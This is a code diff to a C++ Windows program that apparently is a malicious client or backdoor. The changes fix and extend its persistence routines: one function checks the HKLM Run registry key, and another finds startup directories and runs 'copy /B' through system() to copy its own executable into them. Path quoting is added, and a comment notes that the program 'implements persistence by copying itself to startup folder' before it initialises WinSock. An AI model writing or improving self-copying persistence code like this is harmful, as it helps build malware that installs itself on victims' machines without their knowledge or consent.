@@ -13,15 +13,16 @@
 //specify WinSock lib or else symbols will not match
 #pragma comment(lib,"ws2_32.lib") //WinSock lib
 
+
 /*
- * This function will edit registries in order to 
- * obtain persistence for the client and check to
- * see if this has already been accomplished.
- */
+* This function will edit registries in order to
+* obtain persistence for the client and check to
+* see if this has already been accomplished.
+*/
 int reg_maker() {
 	int result = 0; //holds the result of function
-	
-	//check if reg key exists
+
+					//check if reg key exists
 	char* key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
 	HKEY hkey;
 	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key, 0, KEY_READ, &hkey) == ERROR_SUCCESS) {
@@ -47,8 +48,8 @@ int reg_maker() {
 	else
 		std::cout << "Could not open reg key" << std::endl;
 
-	
-	
+
+
 	//close registry editor
 	return 0;
 }
@@ -72,7 +73,6 @@ void split(const std::string& s, char delim, std::vector<std::string>& v) {
 	}
 }
 
-
 /*
  *remove the spaces from each string in the vector
  */
@@ -91,7 +91,7 @@ void remover(std::vector<std::string>& v) {
 
 /*
  *Checks to see in character matched
- *a character in the alphabet
+ *a character in the alphabet or used for directories
  */
 int matcher(char firstletter) {
 	std::string alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\\._:0123456789";
@@ -143,6 +143,9 @@ std::string find_curr_dir() {
 			if (matcher(Path[i]) != -1) {
 				exePath += Path[i];
 			}
+			else if (Path[i] == ' ') {
+				exePath += Path[i];
+			}
 		}
 	}
 	else {
@@ -167,6 +170,7 @@ int startup_finder() {
 	std::vector<std::string> folder;
 	FILE* _pipe = _popen(cmd, "r");
 
+	//redirects stdout to pipe and adds elements of buffer to result string
 	if (!_pipe) {
 		std::cout << "ERROR" << std::endl;
 	}
@@ -178,7 +182,11 @@ int startup_finder() {
 	_pclose(_pipe);
 
 	
-	///////////////////////syntax of command incorrect error/////////////////////////
+	/*
+	 *Parses result and Splits result string by spaces
+	 *Loops parts vector to find elements that contain
+	 *directories then copies the exe to those directories
+	 */
 	result = parser(result, parts);
 	split(result, ' ', parts);
 	for (int i = 0; i < parts.size(); i++) {
@@ -186,13 +194,11 @@ int startup_finder() {
 		if (rest != -1) {
 			folder.push_back(parts[i]);
 			if (parts[i].find('.') == -1) {
-				std::string startup_dir = "copy /B " + exePath + " " + start + parts[i] + end;
-				std::cout << startup_dir << std::endl;
+				std::string startup_dir = "copy /B \"" + exePath + "\" \"" + start + parts[i] + end + "\"";
 				int i = system(startup_dir.c_str());
 			}
 		}
 	}
-	//////////////////////////////////////////////////////////////////////////////////
 
 	return 0;
 }
@@ -202,7 +208,7 @@ int startup_finder() {
  */
 int main()
 {
-	//reg_maker();
+	//Implements persistence by copying itself to startup folder
 	startup_finder();
 
 	//Initialize Socket
